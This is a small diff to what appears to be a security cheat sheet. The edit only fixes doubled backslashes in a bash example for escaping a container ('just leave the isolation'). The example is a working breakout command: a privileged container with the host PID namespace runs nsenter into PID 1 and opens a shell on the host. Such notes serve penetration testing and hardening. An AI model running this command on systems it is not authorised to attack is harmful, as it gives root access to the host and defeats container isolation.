@@ -5,10 +5,10 @@
 If able to start containers, just leave the isolation:
 
 ```bash
-docker run -it \\
-    --privileged \\
-    --pid=host \\
-    alpine \\
+docker run -it \
+    --privileged \
+    --pid=host \
+    alpine \
 	nsenter -t 1 -m -u -n -i sh
 ```
 
